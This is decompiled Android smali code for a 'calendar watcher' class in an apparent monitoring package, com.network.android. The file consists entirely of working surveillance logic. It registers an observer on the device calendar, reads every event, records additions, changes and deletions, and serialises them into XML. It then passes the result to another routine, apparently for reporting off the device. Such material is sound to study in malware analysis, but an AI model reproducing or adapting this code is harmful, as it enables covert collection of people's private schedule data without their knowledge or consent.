.class public final Lcom/network/android/monitor/observer/a;
.super Lcom/network/android/monitor/observer/r;


# static fields
.field private static final b:[Ljava/lang/String;

.field private static e:Landroid/os/Handler;


# instance fields
.field a:Ljava/util/Timer;

.field private f:Landroid/database/ContentObserver;

.field private g:I

.field private h:Ljava/util/Map;

.field private i:Z


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v0, 0x0

    new-array v0, v0, [Ljava/lang/String;

    sput-object v0, Lcom/network/android/monitor/observer/a;->b:[Ljava/lang/String;

    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "AndroidCalendarWatcher"

    invoke-direct {v0, v1}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    new-instance v1, Landroid/os/Handler;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v0

    invoke-direct {v1, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v1, Lcom/network/android/monitor/observer/a;->e:Landroid/os/Handler;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Lcom/network/android/monitor/observer/r;-><init>()V

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, Lcom/network/android/monitor/observer/a;->h:Ljava/util/Map;

    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    iput-object v0, p0, Lcom/network/android/monitor/observer/a;->a:Ljava/util/Timer;

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/network/android/monitor/observer/a;->i:Z

    return-void
.end method

.method static synthetic a(Lcom/network/android/monitor/observer/a;)Ljava/util/Map;
    .locals 1

    iget-object v0, p0, Lcom/network/android/monitor/observer/a;->h:Ljava/util/Map;

    return-object v0
.end method

.method static synthetic b(Lcom/network/android/monitor/observer/a;)Z
    .locals 1

    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/network/android/monitor/observer/a;->i:Z

    return v0
.end method


# virtual methods
.method public final a(Landroid/content/Context;)Lcom/network/android/monitor/b/a;
    .locals 13

    const/4 v1, 0x1

    const/4 v2, 0x0

    const/4 v12, 0x0

    :try_start_0
    const-string v0, "readCalendar start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-boolean v0, p0, Lcom/network/android/monitor/observer/a;->i:Z

    if-nez v0, :cond_1

    const-string v0, "change calendar - calendar map was not loaded!!!!"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_0
    :goto_0
    return-object v12

    :cond_1
    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    invoke-static {v0}, Lcom/network/a/a;->a(Landroid/content/ContentResolver;)Landroid/database/Cursor;

    move-result-object v4

    if-eqz v4, :cond_0

    iget-object v0, p0, Lcom/network/android/monitor/observer/a;->h:Ljava/util/Map;

    invoke-interface {v0}, Ljava/util/Map;->size()I

    move-result v0

    iput v0, p0, Lcom/network/android/monitor/observer/a;->g:I

    invoke-interface {v4}, Landroid/database/Cursor;->getCount()I

    move-result v0

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v5, "curentCount: "

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, " previous: "

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget v3, p0, Lcom/network/android/monitor/observer/a;->g:I

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v5, Ljava/util/HashMap;

    invoke-direct {v5}, Ljava/util/HashMap;-><init>()V

    invoke-static {}, Landroid/util/Xml;->newSerializer()Lorg/xmlpull/v1/XmlSerializer;

    move-result-object v6

    new-instance v7, Ljava/io/StringWriter;

    invoke-direct {v7}, Ljava/io/StringWriter;-><init>()V

    invoke-static {v6, v7}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V

    const-string v0, ""

    const-string v3, "calendar"

    invoke-interface {v6, v0, v3}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_2

    :try_start_1
    const-string v0, "AndroidCalendarWatcher Change or delete Calendar event "

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    move v0, v2

    :goto_1
    invoke-interface {v4}, Landroid/database/Cursor;->moveToNext()Z
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    move-result v3

    if-eqz v3, :cond_8

    add-int/lit8 v3, v0, 0x1

    :try_start_2
    rem-int/lit8 v0, v3, 0x64

    if-nez v0, :cond_2

    const-string v0, "AndroidCalendarWatcher readCalendar counter % 100 : SLEEP_FOR_READ"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-wide/16 v8, 0x3

    invoke-static {v8, v9}, Ljava/lang/Thread;->sleep(J)V

    :cond_2
    new-instance v0, Ljava/lang/StringBuffer;

    invoke-direct {v0}, Ljava/lang/StringBuffer;-><init>()V

    invoke-static {v4, v0}, Lcom/network/a/a;->a(Landroid/database/Cursor;Ljava/lang/StringBuffer;)V

    const/4 v8, 0x4

    invoke-interface {v4, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x7

    invoke-interface {v4, v9}, Landroid/database/Cursor;->getInt(I)I

    move-result v9

    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "AndroidCalendarWatcher Map Calendar position:"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-interface {v4}, Landroid/database/Cursor;->getPosition()I

    move-result v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, " isDeleted: "

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    if-nez v9, :cond_9

    invoke-virtual {v0}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/String;->hashCode()I

    move-result v0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-interface {v5, v8, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v0, p0, Lcom/network/android/monitor/observer/a;->h:Ljava/util/Map;

    invoke-interface {v0, v8}, Ljava/util/Map;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Integer;

    if-nez v0, :cond_3

    const-string v0, "add"

    invoke-static {}, Lcom/network/i/e;->b()Ljava/lang/String;

    move-result-object v10

    invoke-static {v6, v0, v8, v9, v10}, Lcom/network/a/a;->a(Lorg/xmlpull/v1/XmlSerializer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    move v0, v3

    move v2, v1

    goto :goto_1

    :cond_3
    invoke-virtual {v9}, Ljava/lang/String;->hashCode()I

    move-result v10

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    if-eq v10, v0, :cond_9

    const-string v0, "update"

    invoke-static {}, Lcom/network/i/e;->b()Ljava/lang/String;

    move-result-object v10

    invoke-static {v6, v0, v8, v9, v10}, Lcom/network/a/a;->a(Lorg/xmlpull/v1/XmlSerializer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    move v0, v1

    :goto_2
    move v2, v0

    move v0, v3

    goto/16 :goto_1

    :catch_0
    move-exception v0

    :try_start_3
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "AndroidCalendarWatcher Event Exception- "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_1
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    move v0, v3

    goto/16 :goto_1

    :catch_1
    move-exception v0

    :try_start_4
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "AndroidCalendarWatcher Calendar update/remove scan- "

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    if-eqz v4, :cond_4

    :try_start_5
    invoke-interface {v4}, Landroid/database/Cursor;->isClosed()Z

    move-result v0

    if-nez v0, :cond_4

    invoke-interface {v4}, Landroid/database/Cursor;->close()V

    :cond_4
    :goto_3
    iget-object v0, p0, Lcom/network/android/monitor/observer/a;->h:Ljava/util/Map;

    invoke-interface {v0}, Ljava/util/Map;->entrySet()Ljava/util/Set;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_4
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_6

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/util/Map$Entry;

    invoke-interface {v0}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    const-string v3, "update"

    const/4 v4, 0x0

    invoke-static {}, Lcom/network/i/e;->b()Ljava/lang/String;

    move-result-object v8

    invoke-static {v6, v3, v0, v4, v8}, Lcom/network/a/a;->a(Lorg/xmlpull/v1/XmlSerializer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_5
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_2

    goto :goto_4

    :catch_2
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "AndroidCalendarWatcher Calendar listener Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto/16 :goto_0

    :catchall_0
    move-exception v0

    if-eqz v4, :cond_5

    :try_start_6
    invoke-interface {v4}, Landroid/database/Cursor;->isClosed()Z

    move-result v1

    if-nez v1, :cond_5

    invoke-interface {v4}, Landroid/database/Cursor;->close()V

    :cond_5
    throw v0

    :cond_6
    iput-object v5, p0, Lcom/network/android/monitor/observer/a;->h:Ljava/util/Map;

    if-eqz v2, :cond_7

    const-string v0, ""

    const-string v1, "calendar"

    invoke-interface {v6, v0, v1}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    invoke-static {v6}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;)V

    invoke-virtual {v7}, Ljava/io/StringWriter;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v2, 0x0

    invoke-static {p1, v0, v1, v2}, Lcom/network/android/j;->a(Landroid/content/Context;Ljava/lang/String;[Ljava/lang/String;[[B)V

    :cond_7
    const-string v0, "AndroidCalendarWatcher readCalendar end"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    goto/16 :goto_0

    :cond_8
    if-eqz v4, :cond_4

    invoke-interface {v4}, Landroid/database/Cursor;->isClosed()Z

    move-result v0

    if-nez v0, :cond_4

    invoke-interface {v4}, Landroid/database/Cursor;->close()V
    :try_end_6
    .catch Ljava/lang/Throwable; {:try_start_6 .. :try_end_6} :catch_2

    goto :goto_3

    :cond_9
    move v0, v2

    goto/16 :goto_2
.end method

.method public final a(Lcom/network/android/monitor/a/a;)V
    .locals 5

    invoke-super {p0, p1}, Lcom/network/android/monitor/observer/r;->a(Lcom/network/android/monitor/a/a;)V

    const-string v0, "AndroidCalendarWatcher start "

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :try_start_0
    check-cast p1, Lcom/network/e/a/a;

    invoke-virtual {p1}, Lcom/network/e/a/a;->a()Landroid/content/Context;

    move-result-object v0

    iget-object v1, p0, Lcom/network/android/monitor/observer/a;->f:Landroid/database/ContentObserver;

    if-nez v1, :cond_0

    invoke-virtual {p1}, Lcom/network/e/a/a;->a()Landroid/content/Context;

    move-result-object v1

    new-instance v2, Lcom/network/android/monitor/observer/d;

    invoke-direct {v2, p0, p1}, Lcom/network/android/monitor/observer/d;-><init>(Lcom/network/android/monitor/observer/a;Lcom/network/e/a/a;)V

    iput-object v2, p0, Lcom/network/android/monitor/observer/a;->f:Landroid/database/ContentObserver;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    invoke-static {}, Lcom/network/a/a;->a()Landroid/net/Uri;

    move-result-object v2

    const/4 v3, 0x1

    iget-object v4, p0, Lcom/network/android/monitor/observer/a;->f:Landroid/database/ContentObserver;

    invoke-virtual {v1, v2, v3, v4}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    :cond_0
    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "AndroidCalendarWatcher read map delay:0"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v1, Lcom/network/android/monitor/observer/a;->e:Landroid/os/Handler;

    new-instance v2, Lcom/network/android/monitor/observer/b;

    invoke-direct {v2, p0, v0}, Lcom/network/android/monitor/observer/b;-><init>(Lcom/network/android/monitor/observer/a;Landroid/content/ContentResolver;)V

    const-wide/16 v3, 0x0

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "AndroidCalendarWatcher listener Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public final a(Lcom/network/e/a/a;)V
    .locals 4

    :try_start_0
    const-string v0, "readCalendar"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/android/monitor/observer/a;->e:Landroid/os/Handler;

    new-instance v1, Lcom/network/android/monitor/observer/c;

    invoke-direct {v1, p0, p1}, Lcom/network/android/monitor/observer/c;-><init>(Lcom/network/android/monitor/observer/a;Lcom/network/e/a/a;)V

    const-wide/16 v2, 0x3e8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "calendar service start listener Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public final a()[Ljava/lang/String;
    .locals 1

    sget-object v0, Lcom/network/android/monitor/observer/a;->b:[Ljava/lang/String;

    return-object v0
.end method
